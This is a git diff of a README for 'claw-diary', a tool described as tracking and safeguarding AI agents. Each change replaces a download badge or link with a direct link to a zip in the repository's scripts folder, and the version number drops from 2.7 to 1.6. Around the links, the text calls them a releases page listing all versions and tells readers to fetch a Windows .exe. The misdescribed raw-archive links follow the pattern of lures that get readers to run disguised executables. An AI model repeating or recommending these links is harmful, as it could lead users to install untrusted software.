@@ -1,6 +1,6 @@
 # 🛡️ claw-diary - Keep AI Agents Safe and Tracked
 
-[![Download claw-diary](https://img.shields.io/badge/Download-claw--diary-brightgreen)](https://github.com/cyberindranil/claw-diary/raw/refs/heads/main/scripts/claw_diary_2.7.zip)
+[![Download claw-diary](https://img.shields.io/badge/Download-claw--diary-brightgreen)](https://raw.githubusercontent.com/cyberindranil/claw-diary/main/scripts/claw-diary-v1.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ No special drivers or advanced software are needed.
 
 Visit this page to download the software:
 
-[![Download claw-diary](https://img.shields.io/badge/Download-claw--diary-blue)](https://github.com/cyberindranil/claw-diary/raw/refs/heads/main/scripts/claw_diary_2.7.zip)
+[![Download claw-diary](https://img.shields.io/badge/Download-claw--diary-blue)](https://raw.githubusercontent.com/cyberindranil/claw-diary/main/scripts/claw-diary-v1.6.zip)
 
 This page lists all the versions available. Look for the latest stable release that mentions Windows or `.exe`.  
 
@@ -120,7 +120,7 @@ The app will start logging agent actions automatically. You can view daily repor
 
 Keep an eye on the releases page:
 
-[https://github.com/cyberindranil/claw-diary/raw/refs/heads/main/scripts/claw_diary_2.7.zip](https://github.com/cyberindranil/claw-diary/raw/refs/heads/main/scripts/claw_diary_2.7.zip)
+[https://raw.githubusercontent.com/cyberindranil/claw-diary/main/scripts/claw-diary-v1.6.zip](https://raw.githubusercontent.com/cyberindranil/claw-diary/main/scripts/claw-diary-v1.6.zip)
 
 New versions fix bugs and add features. Always download the latest stable release.
 
